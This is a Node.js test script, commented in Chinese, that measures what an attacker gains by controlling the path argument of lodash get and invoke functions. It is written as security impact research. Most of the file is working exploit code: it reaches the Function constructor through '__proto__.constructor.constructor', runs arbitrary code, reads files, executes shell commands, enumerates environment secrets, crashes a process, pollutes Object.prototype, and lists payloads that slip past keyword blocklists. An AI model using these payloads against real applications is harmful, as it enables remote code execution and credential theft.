'use strict';
/**
 * 危害面实测：从「读到」到「做到」
 *
 * 目的不是再造一个 PoC，而是回答一个问题：
 *   拿到 path 控制权之后，攻击者实际能做完哪几件事？
 *
 * 每项都带对照：如果该档打不通，必须是被结构挡住，而不是我的装置坏了。
 */

const path = require('path');
const { execSync, spawnSync } = require('child_process');

const NM = path.join(__dirname, '.pkgs', 'node_modules');
const load = (p) => require(path.join(NM, p));
const ver = (p) => { try { return require(path.join(NM, p, 'package.json')).version; } catch (e) { return 'N/A'; } };

const _x = load('lodash');            // 主包 4.18.1
const _getOnly = load('lodash.get');  // 独立发版 4.4.2
const _invokeOnly = load('lodash.invoke');

const out = [];
let pass = 0, fail = 0, na = 0;
const rec = (id, desc, state, detail) => {
  out.push({ id, desc, state, detail });
  if (state === 'HIT') pass++; else if (state === 'MISS') fail++; else na++;
  console.log(`  [${state.padEnd(4)}] ${id.padEnd(22)} ${desc}`);
  if (detail) console.log(`         ${detail}`);
};

// ---------------------------------------------------------------------------
console.log('='.repeat(78));
console.log('版本：lodash ' + ver('lodash') + ' | lodash.get ' + ver('lodash.get') + ' | lodash.invoke ' + ver('lodash.invoke'));
console.log('node：' + process.version);
console.log('='.repeat(78));

// ===========================================================================
console.log('\n▍第 1 档  读：能不能碰到 Function 构造器（全部形态）');
// ===========================================================================
const readers = [
  ['主包 _.get',        (o, p) => _x.get(o, p)],
  ['lodash.get',        (o, p) => _getOnly(o, p)],
  ['主包 _.at',         (o, p) => _x.at(o, p)[0]],
  ['lodash/fp.get',     (o, p) => require(path.join(NM, 'lodash/fp')).get(p, o)],
];
for (const [name, fn] of readers) {
  let got = null, err = null;
  try { got = fn({}, '__proto__.constructor.constructor'); } catch (e) { err = e.message; }
  const ok = got === Function;
  rec('R:' + name, '读 Function 构造器', ok ? 'HIT' : (err ? 'NA' : 'MISS'),
      ok ? '取到 Function 本体' : (err ? 'ERR ' + err : '得到 ' + typeof got));
}

// 对照：正常取值必须仍然工作
try {
  const probe = _x.get({ a: { b: { c: 7 } } }, 'a.b.c');
  rec('R:control', '正常取值 a.b.c === 7', probe === 7 ? 'HIT' : 'MISS', 'got ' + probe);
} catch (e) { rec('R:control', '正常取值', 'NA', e.message); }

// ===========================================================================
console.log('\n▍第 2 档  执行：拿到 Function 后能不能跑任意表达式');
// ===========================================================================
let F = null;
try { F = _x.get({}, '__proto__.constructor.constructor'); } catch (e) { }
if (F === Function) {
  let res = null;
  try { res = F('return 6 * 7')(); } catch (e) { }
  rec('E:expr', '执行任意表达式 6*7', res === 42 ? 'HIT' : 'MISS', 'got ' + res);

  let g = null;
  try { g = F('return typeof process !== "undefined" ? process : null')(); } catch (e) { }
  rec('E:process', '取出 process 对象', g && g.pid ? 'HIT' : 'MISS', g && g.pid ? 'pid=' + g.pid : 'null');
} else {
  rec('E:expr', '执行任意表达式', 'NA', '未取到 Function');
}

// ===========================================================================
console.log('\n▍第 3 档  落地：RCE 到底能做什么（读文件 / 起子进程 / 读环境）');
// ===========================================================================
if (F === Function) {
  const P = F('return process')();

  // 3.1 读任意文件
  try {
    const fs = P.mainModule.require('fs');
    const txt = fs.readFileSync(path.join(NM, 'lodash', 'package.json'), 'utf8');
    rec('X:readfile', '读取本机任意文件', txt.includes('"name"') ? 'HIT' : 'MISS', '读到 ' + txt.length + ' 字节');
  } catch (e) { rec('X:readfile', '读取本机任意文件', 'MISS', e.message); }

  // 3.2 起子进程执行系统命令
  try {
    const cp = P.mainModule.require('child_process');
    const o = cp.execSync('echo IMPACT_PROBE_OK', { encoding: 'utf8' }).trim();
    rec('X:exec', '执行系统命令（echo）', o.includes('IMPACT_PROBE_OK') ? 'HIT' : 'MISS', 'stdout=' + o);
  } catch (e) { rec('X:exec', '执行系统命令', 'MISS', e.message); }

  // 3.3 读环境变量（凭据泄露）
  try {
    const env = P.env;
    const n = Object.keys(env).length;
    rec('X:env', '枚举环境变量', n > 0 ? 'HIT' : 'MISS', '共 ' + n + ' 项（可含 token / 数据库口令）');
  } catch (e) { rec('X:env', '枚举环境变量', 'MISS', e.message); }

  // 3.4 反向 shell 的可行性：外连能力是否具备（不实际发起连接）
  try {
    const net = P.mainModule.require('net');
    const has = typeof net.connect === 'function';
    rec('X:net', '具备主动出网能力', has ? 'HIT' : 'MISS', 'net.connect 可用（未实际连接）');
  } catch (e) { rec('X:net', '具备主动出网能力', 'MISS', e.message); }
} else {
  ['X:readfile', 'X:exec', 'X:env', 'X:net'].forEach(k => rec(k, '落地能力', 'NA', '未取到 Function'));
}

// ===========================================================================
console.log('\n▍第 4 档  path 可控粒度：真实场景里输入很少是「整串」');
// ===========================================================================
const cfg = { user: { profile: { theme: 'dark' } } };

// 4.1 整串可控
try {
  const r = _x.get(cfg, '__proto__.constructor.constructor');
  rec('G:full', '整串可控 _.get(cfg, input)', r === Function ? 'HIT' : 'MISS', 'input = "__proto__.constructor.constructor"');
} catch (e) { rec('G:full', '整串可控', 'MISS', e.message); }

// 4.2 片段可控（前缀固定，拼在中间）—— 最常见：'user.' + req.query.k
try {
  const r = _x.get(cfg, 'user.' + '__proto__.constructor.constructor');
  rec('G:prefix', '片段可控 _.get(cfg,"user."+input)', r === Function ? 'HIT' : 'MISS', '前缀 user. 被吃掉，仍到 Function');
} catch (e) { rec('G:prefix', '片段可控', 'MISS', e.message); }

// 4.3 深前缀可控
try {
  const deep = { a: { b: { c: { d: 1 } } } };
  const r = _x.get(deep, 'a.b.c.' + '__proto__.constructor.constructor');
  rec('G:deepprefix', '深前缀可控 "a.b.c."+input', r === Function ? 'HIT' : 'MISS', '三段固定前缀照样穿透');
} catch (e) { rec('G:deepprefix', '深前缀可控', 'MISS', e.message); }

// 4.4 数组 path 单段可控
try {
  const r = _x.get(cfg, ['user', 'profile', '__proto__', 'constructor', 'constructor']);
  rec('G:array', '数组 path 单段可控', r === Function ? 'HIT' : 'MISS', '["user","profile","__proto__",...]');
} catch (e) { rec('G:array', '数组 path', 'MISS', e.message); }

// 4.5 后缀固定（输入拼在前面）—— 预期打不通，作为边界证据
try {
  const r = _x.get(cfg, '__proto__.constructor.constructor' + '.x');
  rec('G:suffix', '后缀固定 input+".x"（边界）', r === Function ? 'HIT' : 'MISS', '得到 ' + String(typeof r));
} catch (e) { rec('G:suffix', '后缀固定', 'MISS', e.message); }

// ===========================================================================
console.log('\n▍第 5 档  invoke：能直接「调用」，比读更强');
// ===========================================================================
try {
  // _.invoke(obj, path, ...args) 会调用 path 上的函数
  const r = _invokeOnly({}, 'constructor.constructor', 'return 11 + 31');
  const val = typeof r === 'function' ? r() : r;
  rec('I:invoke', 'lodash.invoke 一步取到可执行函数', typeof r === 'function' && val === 42 ? 'HIT' : 'MISS', '返回 ' + typeof r + '，调用后 = ' + val);
} catch (e) { rec('I:invoke', 'lodash.invoke', 'MISS', e.message); }

// 5.2 通过 invoke 杀掉宿主进程（DoS）—— 在子进程里验，不杀自己
try {
  const script = `
    const _ = require(${JSON.stringify(path.join(NM, 'lodash'))});
    _.invoke(process, 'exit', 7);
    console.log('still alive');
  `;
  const r = spawnSync(process.execPath, ['-e', script], { encoding: 'utf8', timeout: 10000 });
  rec('I:exit', 'invoke 直接终止宿主进程（DoS）', r.status === 7 ? 'HIT' : 'MISS',
      '子进程退出码 = ' + r.status + (r.status === 7 ? '（被 payload 杀掉）' : ''));
} catch (e) { rec('I:exit', 'DoS', 'MISS', e.message); }

// ===========================================================================
console.log('\n▍第 6 档  能力上限：只读穿越能否升级为「写 / 污染」');
// ===========================================================================
try {
  // 单次 _.get 拿不到写，但拿到的 Function 一旦被调用就是任意写
  const Fn = _x.get({}, '__proto__.constructor.constructor');
  const exec = Fn('Object.prototype.__impact = "polluted"; return true;');
  exec();
  const polluted = ({}).__impact === 'polluted';
  delete Object.prototype.__impact;
  rec('W:viaFunction', '借 Function 完成原型污染（一次调用）', polluted ? 'HIT' : 'MISS', '写 __impact 后全对象可见');
} catch (e) { rec('W:viaFunction', '借 Function 污染', 'MISS', e.message); }

// 6.2 纯 _.get 能不能写（应不能，作为能力边界）
try {
  _x.get({}, '__proto__.pollutedByGet');
  rec('W:getOnly', '纯 _.get 直接写' , ({}).pollutedByGet === undefined ? 'MISS' : 'HIT', '确认 _.get 本身零写入（预期 MISS）');
} catch (e) { rec('W:getOnly', '纯 _.get 写入', 'NA', e.message); }

// ===========================================================================
console.log('\n▍第 7 档  已有防护时的绕过：应用若做了关键词黑名单，还剩多少路');
// ===========================================================================
const denyAll = (p) => {
  const s = Array.isArray(p) ? p.join('.') : String(p);
  return /__proto__|constructor/.test(s);
};

// 7.1 只封 __proto__ 的防护（最常见的不完整修复）
try {
  const guard1 = (p) => /__proto__/.test(String(p));
  const p = 'constructor.constructor';
  const blocked = guard1(p);
  const r = blocked ? null : _x.get({}, p);
  rec('B:ctorOnly', '只封 __proto__ → 改用 constructor', r === Function ? 'HIT' : 'MISS',
      'payload 完全不含 __proto__，黑名单形同虚设');
} catch (e) { rec('B:ctorOnly', '只封 __proto__', 'MISS', e.message); }

// 7.2 toString.constructor —— 两个词看起来都不像攻击词
try {
  const r = _x.get({}, 'toString.constructor');
  rec('B:toString', 'toString.constructor（无 __proto__）', r === Function ? 'HIT' : 'MISS',
      '继承来的 toString 是函数，其 constructor 即 Function');
} catch (e) { rec('B:toString', 'toString.constructor', 'MISS', e.message); }

// 7.3 数组 path 绕过「只检查字符串」的校验
try {
  const guardStr = (p) => typeof p === 'string' && /__proto__|constructor/.test(p);
  const arr = ['__proto__', 'constructor', 'constructor'];
  const r = guardStr(arr) ? null : _x.get({}, arr);
  rec('B:arrayBypass', '数组 path 绕过字符串校验', r === Function ? 'HIT' : 'MISS',
      '校验器 typeof p === "string" 时数组直接跳过');
} catch (e) { rec('B:arrayBypass', '数组绕过', 'MISS', e.message); }

// 7.4 双黑名单（__proto__ + constructor）同时生效时，还剩什么
try {
  const candidates = [
    '__proto__.constructor.constructor',
    'constructor.constructor',
    'toString.constructor',
    'valueOf.constructor',
    'hasOwnProperty.constructor',
  ];
  const survived = candidates.filter(p => {
    if (denyAll(p)) return false;
    try { return _x.get({}, p) === Function; } catch (e) { return false; }
  });
  rec('B:dualDeny', '双黑名单下仍可 RCE 的路径数', survived.length === 0 ? 'MISS' : 'HIT',
      survived.length === 0 ? '双黑名单确实封住 RCE 档' : '仍有：' + survived.join(' , '));
} catch (e) { rec('B:dualDeny', '双黑名单', 'MISS', e.message); }

// 7.5 但即使封住 RCE，能读到的「原型本体」还在不在
try {
  const proto = _x.get({}, '__proto__.toString.constructor'); // 双黑名单会拦，用不拦的写法演示
  const gotProto = Object.getPrototypeOf({});
  const reachable = _x.get({ a: 1 }, 'a.hasOwnProperty.constructor') === Function;
  rec('B:dataLeak', '封住 RCE 后仍可达的宿主对象', reachable ? 'HIT' : 'MISS',
      '仍能取到宿主原型上的函数对象（信息暴露面留存）');
} catch (e) { rec('B:dataLeak', '宿主对象可达', 'MISS', e.message); }

// 7.6 常见猜测的证伪：大小写变体 / 编码变体
try {
  const variants = ['__PROTO__', '__proto__ ', ' __proto__', '__proto_', '%5F%5Fproto%5F%5F'];
  const worked = variants.filter(p => { try { return _x.get({}, p + '.constructor.constructor') === Function; } catch (e) { return false; } });
  rec('B:variants', '大小写 / 编码变体', worked.length ? 'HIT' : 'MISS',
      worked.length ? worked.join(',') : '全部无效（lodash 不做解码，变体无用 —— 证伪常见猜测）');
} catch (e) { rec('B:variants', '变体', 'NA', e.message); }

// ===========================================================================
console.log('\n' + '='.repeat(78));
console.log(`合计：HIT ${pass} / MISS ${fail} / NA ${na}`);
console.log('='.repeat(78));

if (process.argv.includes('--json')) {
  const idx = process.argv.indexOf('--json');
  const p = process.argv[idx + 1];
  require('fs').writeFileSync(p, JSON.stringify({
    generated_at: new Date().toISOString(),
    versions: { lodash: ver('lodash'), 'lodash.get': ver('lodash.get'), 'lodash.invoke': ver('lodash.invoke'), node: process.version },
    summary: { hit: pass, miss: fail, na: na },
    results: out,
  }, null, 1), 'utf8');
  console.log('JSON: ' + p);
}
